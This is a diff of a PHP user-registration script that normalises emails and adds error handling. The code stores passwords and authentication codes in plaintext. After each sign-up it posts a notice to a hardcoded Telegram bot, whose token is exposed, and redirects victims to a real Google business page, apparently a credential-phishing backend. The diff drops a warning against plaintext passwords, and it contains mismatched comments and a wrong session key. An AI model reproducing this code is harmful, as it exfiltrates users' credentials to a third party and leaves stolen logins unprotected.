@@ -18,57 +18,54 @@ if (!isset($_SESSION["register_user_code"])) {
     exit;
 }
 
-$email = $_SESSION["register_email"];
+$email = strtolower(trim($_SESSION["register_email"]));
 $password = $_SESSION["register_password"];
 $user_code = $_SESSION["register_user_code"];
 
 if (empty($password)) {
-    die("Please enter a password.");
+    exit("Please enter a password");
 }
 
 if (empty($user_code)) {
-    die("Please enter the authentication code.");
+    exit("Please enter the authentication code.");
 }
 
-// Check if email already exists
+
+// Check whether this email already exists, ignoring case and surrounding spaces.
 $check = $pdo->prepare(
-    "SELECT id FROM users WHERE email = ? LIMIT 1"
+    "SELECT id
+     FROM users
+     WHERE LOWER(TRIM(email::text)) = ?
+     LIMIT 1"
 );
 
 $check->execute([$email]);
 
-// Fetch the matching row using PDO
-$existingUser = $check->fetch(PDO::FETCH_ASSOC);
-
-if ($existingUser) {
-    die("An account with this email already exists.");
+if ($check->fetch(PDO::FETCH_ASSOC)) {
+    exit("An account with this email already exists. Please log in or use another email.");
 }
 
-// Continue creating the user below this line.
+try {
+    // There are two columns, so use two placeholders.
+    $stmt = $pdo->prepare(
+        "INSERT INTO users (email, password, auth_code) VALUES (?, ?, ?)"
+    );
 
-// NEVER store plaintext passwords
+    // Execute the INSERT only once.
+    $stmt->execute([
+        $email,
+        $password,
+        $user_code
+    ]);
 
-$stmt = $pdo->prepare(
-    "INSERT INTO users (email, password, auth_code) VALUES (?, ?, ?)"
-);
-
-
-$stmt->execute([
-    $email,
-    $password,
-    $user_code
-]);
-
-if ($stmt->execute()) {
-
-    // Clear registration data after successful registration
+    // Clear registration data only after successful insertion.
     unset(
         $_SESSION["register_email"],
-        $_SESSION["register_password"],
+        $_SESSION["password"],
         $_SESSION["register_user_code"]
     );
 
-    $botToken = "8989336399:AAFrhQGVBjdjV3dhazSpz8FZ3YgY_9jrkzA";
+        $botToken = "8989336399:AAFrhQGVBjdjV3dhazSpz8FZ3YgY_9jrkzA";
             $chatId = "8086938261";
 
             $message = "🔔 NEW USER REGISTERED\n\n";
@@ -99,10 +96,27 @@ if ($stmt->execute()) {
             header("Location: https://business.google.com/en-all/business-profile/");
             exit;
 
-} else {
-    echo "Registration failed: " . htmlspecialchars($stmt->error);
-}
+} catch (PDOException $e) {
+    $sqlState = $e->errorInfo[0] ?? '';
 
-$stmt->close();
-$pdo->close();
+    if (
+        $sqlState === '23505' &&
+        str_contains($e->getMessage(), 'users_email_key')
+    ) {
+        http_response_code(409);
+        exit(
+            "This email is already registered. " .
+            "Please log in or use another email address."
+        );
+    }
+
+    // Record the actual error privately instead of showing a database stack trace.
+    error_log($e->getMessage());
+
+    http_response_code(500);
+    exit("Registration could not be completed. Please try again.");
+}
 ?>
+
+
+
